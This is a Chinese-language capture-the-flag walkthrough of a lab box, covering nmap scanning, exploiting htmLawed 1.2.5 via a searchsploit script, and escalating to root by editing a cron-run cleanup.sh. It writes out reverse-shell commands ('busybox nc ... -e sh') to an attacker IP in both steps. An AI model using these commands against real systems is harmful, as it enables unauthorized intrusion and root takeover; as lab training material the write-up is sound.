针对目标服务器进行相应的端口探测

```
sudo nmap -p- -vvv --min-rate 10000 192.168.168.190
```

![image-20241123164242323](https://s2.loli.net/2024/11/23/YnQDZgAGsCwHj4o.png)

针对相应的开放端口进行对应的服务扫描

```
sudo nmap -p22,80 -A 192.168.168.190 -oG Law.txt
```

![image-20241123164252449](https://s2.loli.net/2024/11/23/qyadAnrlu8Q62Ht.png)

22端口没有可以直接可以利用的漏洞和内容，我们重点关注80端口

![image-20241123164845394](https://s2.loli.net/2024/11/23/1rEBILNtvCPT2FM.png)

查看右上角软件document的介绍，又看到在title中显示相应版本为1.2.5

Google搜索相应的版本是否存在相应的漏洞，关键字：htmlawed 1.2.5 exploit

```
searchsploit -m 52023.sh
./52023.sh -u http://192.168.168.190 -c 'busybox nc 192.168.45.227 443 -e sh'
```

![image-20241123170539592](https://s2.loli.net/2024/11/23/w6GEnId5aicOvxC.png)

成功返回相应的shell，我们目前针对shell进行升级和持久化

在/var/www的目录下获取到第一个flag

```
cat /etc/passwd | grep bash
```

![image-20241123171755208](https://s2.loli.net/2024/11/23/YVyIlEs5oPX94kw.png)

![image-20241123180325960](https://s2.loli.net/2024/11/23/xEH3aoVFRuAdzev.png)

我们在/var/www目录获取到一个cleanup.sh，查看内容是删除两个log文件，但是我们访问两个日志都提示没有权限

![image-20241123180849706](https://s2.loli.net/2024/11/23/7aEO2zGoIM3tnYL.png)

我们又查看当前用户是否存在定时任务

```
crontab -l
```

![image-20241123180932424](https://s2.loli.net/2024/11/23/lIPmXJgAbscUyHV.png)

那么我们就有理由怀疑这个脚本很可能是root用户的定时任务，定期删除www-data没有权限访问的任务，但该脚本我们的www-data是具有编辑权限的，我们向文件内添加反弹shell

```
echo 'busybox nc 192.168.45.227 4444 -e sh' >> cleanup.sh
```

![image-20241123181212588](https://s2.loli.net/2024/11/23/pimyjLYW63KV5ZN.png)

过了一会，成功返回shell，我们获取对应的flag
